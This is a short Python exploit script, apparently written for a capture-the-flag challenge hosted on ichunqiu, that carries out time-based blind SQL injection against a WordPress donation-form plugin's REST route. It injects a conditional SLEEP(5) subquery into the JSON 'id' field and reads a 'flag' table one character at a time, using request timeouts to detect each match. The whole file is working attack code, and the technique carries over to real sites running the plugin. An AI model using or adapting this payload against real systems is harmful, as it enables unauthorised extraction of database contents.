import requests

url = "http://eci-2ze7ntvll5yea72na3y8.cloudeci1.ichunqiu.com/index.php?rest_route=/xs-donate-form/payment-redirect/3"
tables = "abcdefghijklmnopqrstuvwxyz0123456789-_}{"
result = ""
index=1
while(1):
    for j in tables:
        payload = '{"id": "(SELECT 1 FROM (SELECT(if(mid((select flag from flag limit 0,1),%d,1) = \'%s\',SLEEP(5),1)))me)", "formid": "1", "type": "online_payment"}' % (
            index,j)
        headers = {'Content-Type': 'application/json'}
        #print(payload)
        try:
            r = requests.get(url=url, data=payload, headers=headers, timeout=3)
            #print(r.text)
        except Exception as e:
            result = result+j
            index = index+1
            print(result)
            break